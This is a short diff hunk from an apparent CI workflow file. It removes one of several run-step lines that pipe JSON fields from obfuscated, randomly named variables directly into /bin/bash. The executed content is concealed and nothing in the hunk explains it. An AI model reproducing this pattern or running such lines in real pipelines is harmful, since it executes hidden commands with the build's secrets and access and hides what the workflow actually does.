@@ -27,7 +27,6 @@ jobs:
           echo $b82 | jq -r .zz133 | /bin/bash
           printf '%s' "$e69" | jq -r .cm589 | /bin/bash
           echo $x0 | jq -r .qqf52589 | /bin/bash
-          echo $vgfnb4 | jq -r .h463 | /bin/bash
           echo $sm80247 | jq -r .fyub0 | /bin/bash
           echo $maxlj50149 | jq -r .zfshd67910 | /bin/bash
           echo $k7 | jq -r .fiw7 | /bin/bash
